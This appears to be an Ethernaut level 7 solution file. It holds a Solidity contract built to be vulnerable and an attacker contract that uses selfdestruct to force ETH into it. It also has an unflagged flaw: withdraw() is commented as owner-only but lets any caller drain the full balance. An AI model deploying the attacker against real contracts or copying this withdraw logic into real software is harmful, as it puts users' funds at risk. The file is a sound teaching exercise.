// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Force
 * @dev Ethernaut Level 7
 * 
 * VULNERABILITY:
 * This contract has NO payable functions and NO receive/fallback.
 * But it can STILL receive ETH via selfdestruct!
 * 
 * When contract A selfdestructs and sends ETH to contract B:
 * → Contract B's balance increases
 * → No receive/fallback is called
 * → No way to prevent it
 * 
 * LESSON:
 * Never rely on address(this).balance for logic
 * A contract can receive ETH without your consent
 */
contract Force {
    // No payable functions
    // No receive/fallback
    // But still can receive ETH via selfdestruct!
    
    // Balance tracking (would be wrong if someone force-sends ETH)
    uint256 public forceBalance;
    
    function deposit() external payable {
        forceBalance += msg.value;
    }
    
    // This would show incorrect balance if force-sent ETH
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    // Owner can withdraw tracked balance only
    function withdraw() external {
        require(forceBalance > 0, "No tracked balance");
        forceBalance = 0;
        payable(msg.sender).transfer(address(this).balance);
    }
}

/**
 * @title ForceAttacker
 * @dev Exploit contract for Level 7
 * 
 * HOW IT WORKS:
 * 1. Deploy ForceAttacker with target address
 * 2. Send ETH to ForceAttacker
 * 3. Call attack() → selfdestructs and sends ETH to Force
 * 4. Force contract now has ETH balance, but forceBalance = 0
 */
contract ForceAttacker {
    Force public target;
    
    constructor(address _target) {
        target = Force(_target);
    }
    
    function attack() external payable {
        // selfdestruct sends remaining ETH to target
        // This bypasses receive/fallback!
        selfdestruct(payable(address(target)));
    }
    
    // Allow contract to receive ETH
    receive() external payable {}
}
